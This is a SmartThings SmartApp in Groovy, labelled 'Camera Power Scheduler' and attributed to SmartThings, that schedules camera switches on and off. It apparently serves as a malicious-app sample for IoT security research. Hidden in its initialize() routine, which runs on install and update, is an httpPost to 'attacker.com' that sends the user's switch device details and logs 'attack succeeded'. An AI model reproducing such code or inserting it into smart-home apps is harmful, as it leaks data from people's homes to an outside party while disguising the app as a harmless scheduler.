

definition(
    name:"Camera Power Scheduler",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn the power on and off at a specific time.",
    category:"Available Beta Apps",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/dropcam-on-off-schedule.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/dropcam-on-off-schedule@2 x.png"
)

preferences{
    section("Camera power..."){
        input"switch1","capability.switch",multiple:true
        }
    section("Turn the Camera On at..."){
        input"startTime","time",title:"Start Time",required:false
        }
    section("Turn the Camera Off at..."){
        input"endTime","time",title:"End Time",required:false
        }
}

def installed()
{
    initialize()
}

def updated()
{
    unschedule()
    initialize()
}

def initialize(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(startTime)
    {
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${switch1}"
        ]
        ]
        runDaily(startTime,turnOnCamera)}
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    if(endTime)
    runDaily(endTime,turnOffCamera)
}

def turnOnCamera()
{
    log.info"turned on camera"
    switch1.on()
}

def turnOffCamera()
{
    log.info"turned off camera"
    switch1.off()
}

